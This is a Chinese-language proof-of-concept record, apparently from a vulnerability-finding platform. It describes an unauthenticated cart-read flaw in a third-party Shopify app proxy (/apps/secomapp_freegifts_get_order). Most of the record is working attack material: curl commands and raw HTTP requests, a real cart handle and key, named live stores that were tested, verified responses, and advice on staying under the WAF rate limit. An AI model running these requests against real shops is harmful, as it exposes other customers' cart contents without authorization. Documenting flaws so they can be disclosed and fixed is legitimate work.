# Shopify 第三方 App Proxy /apps/secomapp_freegifts_get_order 未认证按 cart handle 读他人购物车（忽略 ?key）

- **code**: shopify-app-proxy-secomapp-get-order-unauth-cart-read-ignore
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify app proxy（BOGOS / SECOMAPP freegifts app，路径 /apps/secomapp_freegifts_get_order）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: collect.thegamecollection.net（第二店 tgc-collectables.myshopify.com）实测，2026-11-11 UTC，本机 curl（经平台记录代理，单线程、间隔≥4s，finding#106，verdict=verified）：① 会话A `POST /cart/add.js {"items":[{"id":53349715280209,"quantity":2}]}` → 200，Set-Cookie `cart=hWNJ1rpy4ShuD348OMegJoFM%3Fkey%3D0e5d213e9e6628c84e4d8163d2a74103`；② **全新无 cookie 会话** `GET /apps/secomapp_freegifts_get_order?ver=3.0 -H 'Cookie: cart=hWNJ1rpy4ShuD348OMegJoFM'`（handle 去掉 ?key）→ 200 `{"shop":"tgc-collectables.myshopify.com","shopify_cart":{"item_count":1,"total_price":9495,"items":[...]}}`，返回该 handle 购物车完整内容；③ 同 handle 换成 `?key=deadbeef...` → 200 仍返回同一车 item_count=1 total=9495（?key 完全未被校验）；④ 阴性对照：无 Cookie → 200 空车 item_count=0；随机 25 位 handle → 空车。判定成立：app proxy 读路径忽略 ?key，匿名仅凭 25 位 handle 可读他人购物车。原始响应落盘 /opt/artex/data/tasks/7/i1163/。
- **path**: pocs/shopify-app-proxy-secomapp-get-order-unauth-cart-read-ignore/poc.md
- **tags**: shopify,app-proxy,secomapp,bogos,freegifts,cart,idor,unauthorized,handle,access-control
- **created_at**: 2026-11-11T16:14:47.108Z
- **engine**: collect.thegamecollection.net

## 描述

Shopify 店面的 /apps/<app> 路径会被代理给第三方 App（本例 BOGOS/SECOMAPP freegifts app 的 /apps/secomapp_freegifts_get_order）。该代理端点在读取购物车时只看 Cookie 里的 cart=<25位handle>，**不校验 ?key 能力分量**：全新无凭据会话仅凭 handle 即可返回该购物车完整内容（行项目/金额/商品详情/shopify_cart 对象），换成任意错误 key 仍命中同一车。属应用代理层的读写访问控制不一致，读路径宽松而写路径（POST）不产生状态变更、跨店/跨人参数被忽略。与库内 Storefront /cart.js、/api/graphql cart(id:)、/cart/c/{handle} 的「cart key 未强制」族同源，但**入口是独立的第三方 app proxy**，需单独探测。

## 用法

```
前置：目标为 Shopify 托管店且启用了该 app proxy（探测 /apps/secomapp_freegifts_get_order?ver=3.0 是否存在）；知道目标购物车 25 位 handle（**不可枚举**，来自分享的购物车/结账链接、Referer、日志、analytics）；无需任何账号/凭据。

# 1) 会话A 造车拿 cookie（正常加购，拿 <handle>?key=<32hex> 结构）
curl -sk -c cj.txt -X POST 'https://<shop>/cart/add.js' \
  -H 'Content-Type: application/json' --data '{"items":[{"id":<VARIANT_ID>,"quantity":2}]}'
#   -> Set-Cookie: cart=<25位handle>%3Fkey%3D<32hex>

# 2) 全新无 cookie 会话，仅凭 handle（去掉 ?key）读取该车完整内容 → 命中
curl -sk 'https://<shop>/apps/secomapp_freegifts_get_order?ver=3.0' \
  -H 'Cookie: cart=<25位handle>'
#   -> 200 {"shop":"<store>.myshopify.com","shopify_cart":{"item_count":1,"total_price":9495,"items":[...]},...}

# 3) 决定性判据：把 key 换成任意错误值仍返回同一车（?key 未被校验）
curl -sk 'https://<shop>/apps/secomapp_freegifts_get_order?ver=3.0' \
  -H 'Cookie: cart=<handle>?key=deadbeefdeadbeefdeadbeefdeadbeef'
#   -> 200 同一车 item_count/total_price 不变

# 4) 阴性对照（排除 200 兜底误报）：无 Cookie / 随机 handle
curl -sk 'https://<shop>/apps/secomapp_freegifts_get_order?ver=3.0'                    # -> 200 空车 item_count:0
curl -sk 'https://<shop>/apps/secomapp_freegifts_get_order?ver=3.0' -H 'Cookie: cart=AAAAAAAAAAAAAAAAAAAAAAAAA'  # -> 空车

判据：有效 handle + 无 key/错 key → 200 且返回该车完整内容 = 命中；无 handle / 随机 handle → 只回空车 = 排除兜底误报。
边界：POST 写路径不产生状态变更；跨店/跨人参数被忽略（仅读取面）。
失败常见原因：目标未启用该 app proxy（/apps/... 404 或落到 404 页）；拿不到有效 handle（不可枚举，只见空车）——这是关键门槛；handle 与店铺绑定，换店无效；WAF 限速（单线程、间隔≥4s）。
```

## 正文

```
# Shopify 第三方 App Proxy 未认证按 cart handle 读他人购物车（忽略 ?key）

归类：unauthorized（应用代理层读写访问控制不一致）
严重度：low
入口：GET https://<shop>/apps/secomapp_freegifts_get_order?ver=3.0
来源：collect.thegamecollection.net（第二店，tgc-collectables.myshopify.com），finding#106（verdict=verified）

## 一句话
Shopify 店面把 /apps/<app> 路径代理给第三方 App。本例是 BOGOS/SECOMAPP freegifts app 的 `/apps/secomapp_freegifts_get_order`：
它读取购物车时**只看 Cookie 里的 `cart=<25位handle>`，不校验 `?key` 能力分量**。全新无凭据会话仅凭 25 位 handle
即可返回该购物车完整内容（行项目 / 金额 / 商品详情 / collections / shopify_cart 对象）；把 key 换成任意错误值仍命中同一车。

## 前置条件
- 目标为 Shopify 托管店，且启用了对应 app proxy（BOGOS/SECOMAPP freegifts）。探测：`/apps/secomapp_freegifts_get_order?ver=3.0` 存在。
- 知道目标购物车的 **25 位 handle**（不可枚举；来自分享的购物车/结账链接、Referer、访问日志、analytics）。
- 无需任何账号 / Cookie / Token（全匿名）。

## 复现

### 1) 会话A 造车，拿到 cookie 结构 `<handle>?key=<32hex>`
```
POST /cart/add.js HTTP/2
Host: <shop>
Content-Type: application/json

{"items":[{"id":53349715280209,"quantity":2}]}
```
→ 200 `Set-Cookie: cart=hWNJ1rpy4ShuD348OMegJoFM%3Fkey%3D0e5d213e9e6628c84e4d8163d2a74103`

### 2) 全新无 cookie 会话，仅凭 handle（去掉 ?key）读取 → 命中
```
GET /apps/secomapp_freegifts_get_order?ver=3.0 HTTP/2
Host: <shop>
Cookie: cart=hWNJ1rpy4ShuD348OMegJoFM      (handle 去掉 ?key)
```
→ 200
```json
{"shop":"tgc-collectables.myshopify.com",
 "cart":[{...}],
 "shopify_cart":{"item_count":1,"total_price":9495,"items":[{...产品详情...}]},
 "customer_tags":null,"discount_codes":[]}
```

### 3) 决定性判据：换成任意错误 key 仍返回同一车（?key 完全未被校验）
```
GET /apps/secomapp_freegifts_get_order?ver=3.0
Cookie: cart=hWNJ1rpy4ShuD348OMegJoFM?key=deadbeefdeadbeefdeadbeefdeadbeef
```
→ 200 同一车 `item_count=1 total_price=9495`

### 4) 阴性对照：无 handle 时返回空车（排除 200 兜底导致误报）
```
GET /apps/secomapp_freegifts_get_order?ver=3.0
(无 Cookie)
```
→ 200 `{"shopify_cart":{"item_count":0,...}}`；随机 25 位 handle 同为空车。

## 判据 / 边界
- 判据：有效 handle + 无 key/错 key → 200 且返回该车完整内容 = 命中；无 handle / 随机 handle → 只回空车 = 排除兜底误报。
- POST 写路径不产生状态变更；跨店/跨人参数被忽略（仅读取面）。
- handle 不可枚举 → 影响面取决于 handle 泄漏场景。

## 失败常见原因
- 目标未启用该 app proxy → /apps/... 404 或落到 404 页面。
- 拿不到有效 handle（不可枚举）→ 只见空车；这是关键门槛。
- handle 与店铺绑定，换店铺无效。
- WAF 限速：单线程、请求间隔 ≥4s。

## 关联
与库内「Shopify 购物车只读键未强制」族同源，但**入口是独立的第三方 app proxy**，需单独探测：
- #524 Storefront API /api/graphql `cart(id)` 忽略 ?key
- #542 Storefront API `node(id:)` 忽略 ?key
- #549 Ajax Cart API `GET /cart.js` 裸 handle
- #576 同店 www.thegamecollection.net 的 /cart.js + /api/graphql
- #577 购物车 permalink `/cart/c/{handle}`
```
